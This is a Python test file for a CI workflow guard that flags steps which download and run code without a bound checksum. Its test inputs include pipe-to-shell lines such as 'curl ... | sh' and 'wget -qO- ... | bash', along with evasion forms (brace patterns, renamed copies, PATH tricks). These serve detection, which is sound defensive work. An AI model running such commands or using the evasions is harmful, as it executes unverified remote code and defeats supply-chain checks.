"""#1647 (ARC-F2C): the fetch-and-exec guard's parser, on its own.

The #1529 control -- "no workflow may run a binary it fetched without checking
what arrived" -- was a pair of regexes living in `tests/test_workflow_pins.py`,
and run-13 found both of them failing OPEN:

* the fetch pattern required a whitespace-separated short `-o`/`-O` flag and
  excluded pipe characters, so `curl -fsSL https://... | sh` and
  `wget -qO- ... | bash` produced an EMPTY fetch set -- not "unverified", not
  seen as a download at all -- and `--output` was equally invisible; and
* "verified" was any `sha256sum`/`shasum` with `-c` anywhere earlier in the
  step, bound to no path and no digest, so an unrelated checksum of one
  artifact cleared a later unverified `curl -o payload; chmod +x payload`.

A guard over shell text that cannot read the shell reports a clean pass on
every form its regex does not parse, which is the worst answer a control can
give. So the logic moved into `scripts/workflow_guard.py` -- a small, real
parser: statements split quote-aware on `;`, `&&`, `||`, `|` and newlines,
argv from `shlex`, heredocs and continuations joined first -- and this module
is its specification. Every case below returned None ("clean") from the regex
it replaces; the ones marked BASE-CLEAN are the exact forms run-13 named.

The repo-wide application of the rule (every `run:` step in
`.github/workflows/*.yml`, plus the exemption list) stays in
`tests/test_workflow_pins.py`, beside the sibling rules it shares a posture
check with.
"""
import os
import re
import tempfile
import unittest
from unittest import mock

import shell_reader
import workflow_forms
import workflow_guard as wg
# The download shape itself lives in the layer below the rule (#1697).
from workflow_forms import Fetch

HEX = "a" * 64
OTHER_HEX = "b" * 64


class TestFetchParsing(unittest.TestCase):
    """What the parser SEES. Each form is a way to spell the same act."""

    def one(self, script):
        found = wg.fetches(script)
        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
                         % (script, found))
        return found[0]

    def test_short_output_flag(self):
        self.assertEqual(
            Fetch("curl", "https://example.test/a", "/tmp/a", None),
            self.one("curl -sfL https://example.test/a -o /tmp/a\n"))

    def test_attached_short_output_flag(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -o/tmp/a https://example.test/a\n").dest)

    def test_clustered_short_flags(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -sfLo /tmp/a https://example.test/a\n").dest)

    def test_long_output_flag_is_seen(self):
        # BASE-CLEAN: the old regex required a short `-o`/`-O`.
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL --output /tmp/a https://example.test/a\n").dest)

    def test_long_output_flag_with_an_equals_is_seen(self):
        # BASE-CLEAN.
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL --output=/tmp/a https://example.test/a\n").dest)

    def test_curl_remote_name_writes_the_url_basename(self):
        self.assertEqual("payload.sh",
                         self.one("curl -fsSLO https://example.test/d/payload.sh\n").dest)

    def test_curl_without_an_output_flag_is_stdout(self):
        # BASE-CLEAN: the whole pipeline form. dest is None -- there is no file.
        self.assertEqual(
            Fetch("curl", "https://example.test/i.sh", None, ("sh",)),
            self.one("curl -fsSL https://example.test/i.sh | sh\n"))

    def test_wget_writes_the_url_basename_by_default(self):
        self.assertEqual("payload",
                         self.one("wget https://example.test/payload\n").dest)

    def test_wget_output_document(self):
        for script in ("wget -O /tmp/a https://example.test/a\n",
                       "wget --output-document /tmp/a https://example.test/a\n",
                       "wget --output-document=/tmp/a https://example.test/a\n"):
            self.assertEqual("/tmp/a", self.one(script).dest, script)

    def test_wget_dash_O_dash_is_stdout(self):
        # BASE-CLEAN: `wget -qO- ... | bash`, the second form run-13 named.
        self.assertEqual(
            Fetch("wget", "https://example.test/i.sh", None, ("bash",)),
            self.one("wget -qO- https://example.test/i.sh | bash\n"))

    def test_wgets_lowercase_o_is_a_LOG_file_not_the_destination(self):
        # curl's `-o` and wget's `-o` are different options; one parser that
        # treats them alike writes the log path into the guard's dest field.
        fetch = self.one("wget -o /tmp/wget.log https://example.test/payload\n")
        self.assertEqual("payload", fetch.dest)

    def test_a_redirect_is_a_destination(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL https://example.test/a > /tmp/a\n").dest)

    def test_a_fetch_anywhere_in_a_pipeline_is_seen(self):
        self.assertEqual("/tmp/a",
                         self.one("echo go | curl -fsSL https://example.test/a -o /tmp/a\n").dest)

    def test_the_piped_stage_is_recorded_as_argv(self):
        self.assertEqual(("python3", "-"),
                         self.one("curl -fsSL https://example.test/i.py | python3 -\n").piped_to)

    def test_continuations_are_joined(self):
        script = ("curl -sfL --connect-timeout 5 --max-time 60 --retry 3 \\\n"
                  "  -o /tmp/hadolint \\\n"
                  "  https://example.test/hadolint-Linux-x86_64\n")
        self.assertEqual(
            Fetch("curl", "https://example.test/hadolint-Linux-x86_64",
                  "/tmp/hadolint", None),
            self.one(script))

    def test_a_quoted_url_keeps_its_variable_expansions(self):
        fetch = self.one('curl -sfL "https://example.test/v${VERSION}/x" -o /tmp/x\n')
        self.assertEqual("https://example.test/v${VERSION}/x", fetch.url)

    def test_two_fetches_in_one_step_are_both_seen(self):
        found = wg.fetches("curl -fsSL https://example.test/a -o /tmp/a\n"
                           "wget -O /tmp/b https://example.test/b\n")
        self.assertEqual(["/tmp/a", "/tmp/b"], [f.dest for f in found])

    def test_a_commented_out_fetch_is_not_a_fetch(self):
        # Half this repo's workflow prose QUOTES the command it explains; a
        # guard that reads its own documentation as an act flags the comment.
        self.assertEqual([], wg.fetches("# curl -fsSL https://example.test/x | sh\n"
                                        "make test   # not curl -o /tmp/x\n"))

    def test_a_script_with_no_fetch_has_none(self):
        self.assertEqual([], wg.fetches("make test\nchmod +x ./run.sh\n"))


class TestStderrRedirectsAreNotTheDestination(unittest.TestCase):
    """#1733 (COD-C2C): `stage.writes[-1]` used to overwrite a correctly
    parsed `-o`/`-O` destination with whatever a trailing `2>&1` or
    `2>/dev/null` happened to file as a write, so an ordinary stderr redirect
    on a fetch line silently defeated the guard. `shell_reader`'s own spec for
    the parser change is in tests/test_shell_reader.py; these are the
    guard-level shapes the issue named."""

    def one(self, script):
        found = wg.fetches(script)
        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
                         % (script, found))
        return found[0]

    def test_a_stderr_redirect_after_the_output_flag_does_not_replace_the_dest(self):
        fetch = self.one(
            "curl -fsSL https://example.test/install.sh -o /tmp/i.sh 2>/dev/null\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_still_caught_end_to_end(self):
        script = ("curl -fsSL https://example.test/install.sh -o /tmp/i.sh "
                  "2>/dev/null && bash /tmp/i.sh\n")
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_fd_duplication_after_the_output_flag_does_not_replace_the_dest(self):
        fetch = self.one(
            "curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | tee log\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_still_caught_end_to_end_too(self):
        script = ("curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | "
                  "tee log && sh /tmp/i.sh\n")
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_stdout_redirect_followed_by_a_stderr_dup_still_names_the_file(self):
        fetch = self.one("curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_caught_end_to_end_with_a_semicolon(self):
        script = "curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1; sh /tmp/i.sh\n"
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_bare_fd_dup_with_no_output_flag_stays_stdout(self):
        # No file at all -- the destination stays what it always was
        # (stdout), not the literal `&2`.
        fetch = self.one("curl -fsSL https://example.test/i.sh >&2\n")
        self.assertIsNone(fetch.dest)

    def test_that_shape_stays_clean_with_no_pipe(self):
        # Regression guard: nothing landed on disk and nothing consumed the
        # stream, so this is not the rule's business, same as before #1733.
        self.assertIsNone(
            wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh >&2\n"))

    def test_wget_piped_to_sh_with_a_stderr_redirect_is_still_caught(self):
        # The headline pipe-to-shell shape must survive the fix untouched.
        script = "wget -qO- https://example.test/i.sh 2>/dev/null | sh\n"
        fetch = self.one(script)
        self.assertIsNone(fetch.dest)
        self.assertEqual(("sh",), fetch.piped_to)
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("sh", why)

    def test_a_stderr_redirect_with_no_output_flag_does_not_become_the_dest(self):
        fetch = self.one("curl -fsSL https://example.test/i.sh 2>err.log\n")
        self.assertIsNone(fetch.dest)

    def test_combined_stream_redirects_are_a_real_destination(self):
        # Round 1 fix (opus review on 435e6f6): `&>word` / `&>>word` /
        # unnumbered `>&word` (attached or spaced) are bash's `>word 2>&1`
        # shorthand -- a REAL destination, caught the same as an explicit
        # `-o`. At the reviewed head every one of these five reported clean.
        for script in (
            "curl -fsSL https://example.test/i.sh &>/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh &> /tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh &>>/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh >&/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh >& /tmp/i.sh\n",
        ):
            fetch = self.one(script)
            self.assertEqual("/tmp/i.sh", fetch.dest, script)
            why = wg.fetch_exec_defect(script + "sh /tmp/i.sh\n")
            self.assertIsNotNone(why, script)
            self.assertIn("/tmp/i.sh", why, script)

    def test_the_exact_reported_reproduction_is_caught(self):
        why = wg.fetch_exec_defect(
            "curl https://example.test/i.sh &> /tmp/i.sh && sh /tmp/i.sh\n")
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_stdout_redirect_to_dev_stderr_still_means_nothing_was_written(self):
        # NIT fix (round 1): `/dev/stderr` means "nothing was written" only
        # when a STDOUT REDIRECT landed there.
        fetch = self.one("curl -fsSL https://example.test/i.sh > /dev/stderr\n")
        self.assertIsNone(fetch.dest)

    def test_an_explicit_dest_of_dev_stderr_is_still_caught(self):
        # NIT fix (round 1): unlike a redirect, `-o /dev/stderr` really did
        # write there -- reverting the STDOUT-tuple shortcut must not also
        # silence this, which was caught before #1733 touched STDOUT.
        fetch = self.one("curl -fsSL https://example.test/i.sh -o /dev/stderr\n")
        self.assertEqual("/dev/stderr", fetch.dest)
        why = wg.fetch_exec_defect(
            "curl -fsSL https://example.test/i.sh -o /dev/stderr\nsh /dev/stderr\n")
        self.assertIsNotNone(why)


class TestVerificationBinding(unittest.TestCase):
    """What the parser ACCEPTS: a checksum bound to the fetched path, run
    before the bytes are used. Everything else is theatre."""

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    EXEC = "chmod +x /tmp/payload\n"

    def test_a_pipeline_into_a_shell_is_always_unverified(self):
        # BASE-CLEAN. There is no file to hash, so no checksum can rescue it.
        why = wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh | sh\n")
        self.assertIn("https://example.test/i.sh", why)
        self.assertIn("sh", why)

    def test_a_checksum_cannot_rescue_a_pipeline(self):
        script = ('echo "%s  /tmp/x" | sha256sum -c -\n' % HEX +
                  "curl -fsSL https://example.test/i.sh | bash\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_wget_piped_into_bash_is_unverified(self):
        # BASE-CLEAN.
        self.assertIsNotNone(
            wg.fetch_exec_defect("wget -qO- https://example.test/i.sh | bash\n"))

    def test_a_bound_checksum_clears_it(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_checksum_naming_another_file_verifies_nothing(self):
        # BASE-CLEAN: the unbound-checksum half of #1647.
        script = (self.FETCH +
                  'echo "%s  /tmp/other" | sha256sum -c -\n' % OTHER_HEX +
                  self.EXEC)
        why = wg.fetch_exec_defect(script)
        self.assertIn("/tmp/payload", why)

    def test_an_earlier_checksum_of_a_different_download_does_not_clear_it(self):
        # BASE-CLEAN, and the exploit run-13 wrote out: one verified artifact
        # in the step used to clear every later one.
        script = ("curl -sfL https://example.test/tool -o /tmp/tool\n"
                  'echo "%s  /tmp/tool" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/tool\n" + self.FETCH + self.EXEC)
        why = wg.fetch_exec_defect(script)
        self.assertIn("/tmp/payload", why)
        self.assertNotIn("/tmp/tool", why)

    def test_a_checksum_after_the_chmod_is_still_a_defect(self):
        script = (self.FETCH + self.EXEC +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
        self.assertIn("only AFTER", wg.fetch_exec_defect(script))

    def test_a_sums_file_the_step_wrote_counts(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
                  "sha256sum -c /tmp/sums\n" + self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_heredoc_sums_list_counts(self):
        script = (self.FETCH +
                  "sha256sum -c <<EOF\n%s  /tmp/payload\nEOF\n" % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_sums_file_naming_another_download_does_not_count(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/other" > /tmp/sums\n' % OTHER_HEX +
                  "sha256sum -c /tmp/sums\n" + self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_sums_file_the_step_never_wrote_does_not_count(self):
        # Nothing in the step ties that file to this download; it may not even
        # exist, and `sha256sum -c` on an absent list is the caller's problem.
        script = self.FETCH + "sha256sum -c /tmp/sums\n" + self.EXEC
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_shasum_a_256_counts(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" | shasum -a 256 -c -\n' % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_check_carrying_no_digest_verifies_nothing(self):
        # Naming the file is not checking it: something has to be the expected
        # digest, whether a literal or the pinned variable holding one.
        script = (self.FETCH + 'echo "/tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_pinned_digest_variable_counts_as_the_digest(self):
        script = (self.FETCH +
                  'echo "${PAYLOAD_SHA256}  /tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_basename_match_from_another_directory_verifies_nothing(self):
        # M1: a sums list may carry bare names, but only for a bare name. With
        # a directory in the dest, `x.sh` is a DIFFERENT file, and accepting it
        # is the unbound-checksum defect wearing a shorter path.
        script = ("curl -sfL https://example.test/x.sh -o /tmp/evil/x.sh\n"
                  'echo "%s  x.sh" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/evil/x.sh\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_bare_name_still_matches_its_own_basename(self):
        script = ("curl -sfL https://example.test/x.sh -O\n"
                  'echo "%s  x.sh" | sha256sum -c -\n' % HEX +
                  "chmod +x x.sh\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_variable_that_is_not_a_digest_is_not_a_digest(self):
        # L3: `$FILE` is a path, `$SHA256` is an expectation. Accepting any
        # expansion made `echo "$FILE  /tmp/payload" | sha256sum -c -` a check.
        script = (self.FETCH + 'echo "$FILE  /tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_the_late_checksum_message_names_the_fetch_and_the_remedy(self):
        # L4: "verifies X only AFTER Y" said what was wrong and not what to do.
        script = (self.FETCH + self.EXEC +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
        why = wg.fetch_exec_defect(script)
        self.assertIn("only AFTER", why)
        self.assertIn("https://example.test/payload", why)
        self.assertIn("sha256sum -c", why)

    def test_the_message_says_what_would_satisfy_the_guard(self):
        why = wg.fetch_exec_defect(self.FETCH + self.EXEC)
        self.assertIn("sha256sum -c", why)
        self.assertIn("/tmp/payload", why)


class TestWhatCountsAsExecuting(unittest.TestCase):
    """The uses that turn fetched bytes into behaviour."""

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"

    def use(self, line):
        return wg.fetch_exec_defect(self.FETCH + line)

    def test_chmod_plus_x(self):
        self.assertIsNotNone(self.use("chmod +x /tmp/payload\n"))

    def test_running_the_file_directly(self):
        self.assertIsNotNone(self.use("/tmp/payload --version\n"))

    def test_running_it_through_an_interpreter(self):
        self.assertIsNotNone(self.use("python3 /tmp/payload\n"))

    def test_unpacking_it_with_tar(self):
        self.assertIsNotNone(self.use("tar -xzf /tmp/payload\n"))

    def test_unpacking_it_with_unzip(self):
        self.assertIsNotNone(self.use("unzip -q /tmp/payload\n"))

    def test_installing_it(self):
        self.assertIsNotNone(self.use("install -m 0755 /tmp/payload /usr/local/bin/p\n"))

    def test_moving_it_onto_PATH(self):
        self.assertIsNotNone(self.use("sudo mv /tmp/payload /usr/local/bin/payload\n"))

    def test_catting_it_into_a_shell(self):
        self.assertIsNotNone(self.use("cat /tmp/payload | sh\n"))

    def test_an_interpreter_reading_it_from_stdin(self):
        # M3: `bash < x.sh` runs x.sh. The file is never an argument, so a
        # guard that reads argv only sees `bash` with nothing after it.
        for line in ("bash < /tmp/payload\n",
                     "sh -s -- --yes < /tmp/payload\n",
                     "python3 < /tmp/payload\n"):
            self.assertIsNotNone(self.use(line), line)

    def test_running_a_copy_of_it_under_another_name(self):
        # M2: renaming laundered the file -- the copy branch only fired for a
        # destination on PATH, so `cp x y; ./y` ran unverified bytes under a
        # name the guard had never heard of.
        for copy in ("cp /tmp/payload /tmp/alias\n",
                     "mv /tmp/payload /tmp/alias\n",
                     "ln -s /tmp/payload /tmp/alias\n",
                     "cat /tmp/payload > /tmp/alias\n"):
            why = self.use(copy + "chmod +x /tmp/alias\n/tmp/alias\n")
            self.assertIsNotNone(why, copy)

    def test_symlinking_it_onto_PATH(self):
        # The alias is then invoked by a bare name this script never mentions.
        self.assertIsNotNone(self.use("ln -s /tmp/payload /usr/local/bin/p\n"))

    def test_a_checksum_naming_the_alias_clears_it(self):
        script = (self.FETCH + "cp /tmp/payload /tmp/alias\n" +
                  'echo "%s  /tmp/alias" | sha256sum -c -\n' % ("a" * 64) +
                  "chmod +x /tmp/alias\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_copying_a_data_file_is_not_executing_it(self):
        script = ("curl -sfL https://example.test/d.json -o /tmp/d.json\n"
                  "cp /tmp/d.json /tmp/copy.json\njq . /tmp/copy.json\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_that_is_never_executed_is_left_alone(self):
        script = ("curl -sfL https://example.test/data.json -o /tmp/d.json\n"
                  "jq . /tmp/d.json\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_download_piped_to_a_reader_is_left_alone(self):
        self.assertIsNone(
            wg.fetch_exec_defect("curl -fsSL https://example.test/k.gpg | gpg --import\n"))

    def test_a_script_with_no_fetch_is_left_alone(self):
        self.assertIsNone(wg.fetch_exec_defect("make test\nchmod +x ./run.sh\n"))

    def test_executing_a_file_this_step_never_fetched_is_not_this_rules_business(self):
        self.assertIsNone(wg.fetch_exec_defect("chmod +x ./scripts/local.sh\n"
                                               "./scripts/local.sh\n"))


class TestADownloadNamedLikeAWrapper(unittest.TestCase):
    """#2227: the reader knows a wrapper by its basename and reads through it,
    so a download called `flock`, run as `./flock 9`, came out as the `flock`
    wrapper running nothing, and only what the reader left was compared with
    the download. Each word read as a wrapper is compared with the downloads
    too, as the command word is, and is still read through."""

    URL = "https://example.test/tool"

    def test_a_download_run_as_a_wrapper_is_running_it(self):
        url = self.URL
        for script in (
                # FLAGGED on main, where `flock` and `setsid` were not wrappers yet.
                f"touch flock && chmod +x flock && curl -fsSL -o flock {url} && ./flock 9\n",
                f"curl -fsSL -o /tmp/flock {url}\n/tmp/flock 9\n",
                f"curl -fsSL -o bin/flock {url}\nbin/flock -n /tmp/lock make build\n",
                f"curl -fsSL -o setsid {url}\nsudo ./setsid true\n",
                # An older wrapper name, CLEAN on main, and one reached through a copy.
                f"curl -fsSL -o env {url}\n./env FOO=1 make build\n",
                f"curl -fsSL -o /tmp/payload {url}\ncp /tmp/payload ./nohup\n./nohup make\n",
                # A bare name, compared as a bare `tool` is: with `.` on PATH it runs the download.
                f"curl -fsSL -o flock {url}\nPATH=.:$PATH flock 9\n"):
            with self.subTest(script=script):
                self.assertIn("running it", wg.fetch_exec_defect(script) or "")

    def test_a_wrapper_word_naming_another_file_is_not_the_download(self):
        # The same name is not the same file: `/usr/bin/env` is not ./env, and
        # ./flock is not /tmp/flock.
        for script in (f"curl -fsSL -o env {self.URL}\n/usr/bin/env FOO=1 make\n",
                       f"curl -fsSL -o /tmp/flock {self.URL}\n./flock 9\n"):
            with self.subTest(script=script):
                self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_dynamic_path_to_a_download_behind_a_wrapper_is_reported(self):
        # Main refused `$PWD/flock` behind `sudo`, as it refuses `sudo "$X"`:
        # reading it as the `flock` wrapper by its last word read it clean.
        # The older names get the same refusal now (`$PWD/env` runs the
        # download as root here), which is the cost the rule accepts.
        for script in (f'curl -fsSL -o flock {self.URL}\nsudo "$PWD/flock" 9\n',
                       f'curl -fsSL -o env {self.URL}\nsudo "$PWD/env" FOO=1 make\n'):
            with self.subTest(script=script):
                self.assertIn("dynamic command operand behind a wrapper",
                              wg.fetch_exec_defect(script) or "")

    def test_a_dynamic_word_behind_a_wrapper_is_unresolved_whatever_its_name(self):
        argv = shell_reader.statements('sudo "$PWD/chrt" 10 make')[0].stages[0].argv
        self.assertIn("dynamic command operand behind a wrapper",
                      shell_reader.unresolved_wrapper(argv) or "")
        self.assertIn("cannot read command behind wrapper",
                      wg.fetch_exec_defect('sudo "$PWD/chrt" 10 make\n') or "")

    def test_a_download_under_any_other_name_is_running_it_as_before(self):
        script = f"touch tool && chmod +x tool && curl -fsSL -o tool {self.URL} && ./tool 9\n"
        self.assertIn("running it", wg.fetch_exec_defect(script) or "")

    def test_a_copied_system_wrapper_is_still_read_through(self):
        # Nothing fetched ./env, so reading through it is what finds the fetch
        # it runs: taking `./env` for a plain file would read this step clean.
        script = f"cp /usr/bin/env ./env\n./env sh -c 'curl -fsSL {self.URL} | sh'\n"
        self.assertIn("straight to `sh`", wg.fetch_exec_defect(script) or "")

    def test_a_wrapper_with_nothing_fetched_reads_as_before(self):
        self.assertEqual([], shell_reader.command(["flock", "9"]))
        self.assertIsNone(shell_reader.unresolved_wrapper(["flock", "9"]))
        self.assertIsNone(wg.fetch_exec_defect("flock 9\n./flock 9\n"))


class TestADownloadRunThroughAnExpandedPath(unittest.TestCase):
    """#2310: `curl -o tool …; "$PWD/tool" 9` read clean, because a use is
    bound to a download by its spelling and the fetch spelled it `tool`; bash
    3.2 and 5.2 run the download through each spelling in the first test (a
    `chmod +x tool` before the fetch survives it). A command word holding a
    `$` or `$(...)` that ends in a download's basename is now running it."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def defect(self, run, dest="tool"):
        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))

    def test_a_command_word_ending_in_its_basename_is_running_it(self):
        for run in ('"$PWD/tool" 9\n', '"${PWD}/tool" 9\n', "$PWD/tool 9\n",
                    '"$PWD"/tool 9\n', '"$(pwd)/tool" 9\n', '"`pwd`/tool" 9\n',
                    '"$(dirname "$PWD/x")/tool" 9\n', "x=1 $PWD/tool 9\n",
                    'for i in 1; do "$PWD/tool" 9; done\n',
                    'find . -name tool -exec "$PWD/tool" {} \\;\n'):
            with self.subTest(run=run):
                self.assertIn("-> tool and running it with nothing verifying",
                              self.defect(run) or "")

    def test_wherever_the_fetch_put_it(self):
        # Bound by the basename: what `$PWD` expands to is not evaluated, so
        # `d/tool` is read as run too -- which bash does not do from the
        # checkout, and is the fail-closed side to be wrong on.
        for dest, run in (("bin/tool", '"$PWD/bin/tool" 9\n'),
                          ("/tmp/tool", '"$RUNNER_TEMP/tool" 9\n'),
                          ("d/tool", '"$PWD/tool" 9\n')):
            with self.subTest(dest=dest):
                self.assertIn("running it", self.defect(run, dest) or "")

    def test_as_a_wrapper_word_through_a_copy_and_behind_a_wrapper(self):
        # `"$PWD/flock"` is read through as `flock`, but runs the download.
        self.assertIn("running it", self.defect('"$PWD/flock" 9 true\n', "flock") or "")
        self.assertIn("running it (as `alias`, copied from it earlier)",
                      self.defect('cp tool alias\n"$PWD/alias" 9\n') or "")
        # Refused behind `sudo` already; now it is the download's use as well.
        why = wg.fetch_exec_defects("curl -fsSL -o tool %s\nsudo \"$PWD/tool\" 9\n" % self.URL)
        self.assertEqual(2, len(why), why)
        self.assertIn("dynamic command operand behind a wrapper", why[0])
        self.assertIn("running it", why[1])

    def test_a_check_before_it_clears_it_and_one_after_it_does_not(self):
        self.assertIsNone(self.defect(self.CHECK % "tool" + '"$PWD/tool" 9\n'))
        self.assertIn("only AFTER running it",
                      self.defect('"$PWD/tool" 9\n' + self.CHECK % "tool") or "")

    def test_a_check_still_binds_by_its_exact_spelling(self):
        # Reported although bash checks the same file: read that loosely, a
        # checksum of `$OTHER/tool` would clear a `./tool` it never read.
        self.assertIn("no checksum in the job names tool",
                      self.defect(self.CHECK % "$PWD/tool" + '"$PWD/tool" 9\n') or "")

    def test_another_basename_or_a_static_path_is_not_the_download(self):
        for run in ('"$PWD/other" 9\n', '"$PWD/tool.sh" 9\n', '"$PWD/tool/.." 9\n',
                    "./bin/tool 9\n", "/usr/bin/tool 9\n"):
            with self.subTest(run=run):
                self.assertIsNone(self.defect(run))


class TestADownloadWrittenIntoADirectoryOnPath(unittest.TestCase):
    """#2308: `curl -o /usr/local/bin/tool …; tool --version` read clean: the
    download is bound to its path, and `tool` is not that path, but bash finds
    the file by looking the bare name up on PATH. A bare name that is the
    basename of a download written into one of `workflow_operands.PATH_DIRS` is
    now running it -- as the command or as a wrapper word, still read
    through."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def defect(self, dest, run):
        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))

    def test_a_bare_name_runs_a_download_in_a_directory_on_path(self):
        for dest in ("/usr/local/bin/tool", "/usr/bin/tool", "/bin/tool",
                     "/usr/local/sbin/tool", '"$HOME/.local/bin/tool"',
                     '"${HOME}/.local/bin/tool"', "~/.local/bin/tool",
                     "/usr/local/bin/./tool",
                     # review N-4: the runner's `~/.local/bin`, spelled out
                     "/home/runner/.local/bin/tool",
                     # not on a hosted runner's PATH, and kept: fail-closed
                     "/opt/bin/tool"):
            with self.subTest(dest=dest):
                self.assertIn("running it with nothing verifying",
                              self.defect(dest, "tool --version\n") or "")
        script = "curl -fsSL --output-dir /usr/local/bin -O %s\ntool\n" % self.URL
        self.assertIn("-> /usr/local/bin/tool and running it", wg.fetch_exec_defect(script) or "")

    def test_behind_a_wrapper_and_as_one(self):
        for dest, run in (("/usr/local/bin/tool", "sudo tool --version\n"),
                          ("/usr/local/bin/tool", "env FOO=1 tool\n"),
                          ("/usr/local/bin/flock", "flock 9 make\n"),
                          ("/usr/local/bin/env", "env FOO=1 make\n")):
            with self.subTest(dest=dest, run=run):
                self.assertIn("running it", self.defect(dest, run) or "")
        # Still read through: the command behind the wrapper word is `make`.
        self.assertEqual(["make"], shell_reader.command(["flock", "9", "make"]))

    def test_a_check_binds_by_the_path_and_not_by_the_bare_name(self):
        self.assertIsNone(self.defect("/usr/local/bin/tool",
                                      self.CHECK % "/usr/local/bin/tool" + "tool\n"))
        # `sha256sum -c` of the bare `tool` reads ./tool: taking it for the
        # download would clear bytes nothing checked.
        self.assertIn("no checksum in the job names /usr/local/bin/tool",
                      self.defect("/usr/local/bin/tool", self.CHECK % "tool" + "tool\n") or "")

    def test_off_path_or_run_by_a_path_it_is_not_the_bare_name(self):
        for dest, run in (("/tmp/tool", "tool\n"), ("bin/tool", "tool\n"),
                          ("/opt/tool/bin/tool", "tool\n"),
                          ("/usr/local/bin/tool", "./tool\n"),
                          ("/usr/local/bin/tool", "tools\n"),
                          ("/usr/local/bin/tool", "echo tool\n")):
            with self.subTest(dest=dest, run=run):
                self.assertIsNone(self.defect(dest, run))


class TestAPatternWhereTheCommandStarts(unittest.TestCase):
    """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
    in a checkout holding a file called sh, before the command runs, which the
    guard read clean. Where the command or a wrapper's operand is expected,
    such a word is reported unread; quoted, it is the literal word, which runs
    nothing, as before."""

    PAYLOAD = "'curl -fsSL https://example.test/i.sh | sh'"

    def test_it_is_reported(self):
        for script in ("{sh,-c} %s\n", "[s]h -c %s\n", "sudo {sh,-c} %s\n",
                       "taskset {0x1,sh} -c %s\n", "exec -a {x,sh} -c %s\n",
                       "if {sh,-c} %s; then :; fi\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertEqual(1, len(why), why)
                self.assertIn("cannot read command", why[0][1])
        why = wg.fetch_exec_defect("{sh,-c} %s\n" % self.PAYLOAD) or ""
        self.assertIn("cannot read command: `{sh,-c}` is a pattern", why)

    def test_quoted_it_reads_as_before(self):
        for script in ("'{sh,-c}' %s\n", '"[s]h" -c %s\n', "echo {a,b} [s]h * %s\n",
                       "[ -f x ] && echo %s\n", "arr[0]=x\n", "xargs -I {} echo {} < l\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script.replace(
                    "%s", self.PAYLOAD))]))

    def test_where_a_shell_looks_for_c_or_a_script_it_is_reported(self):
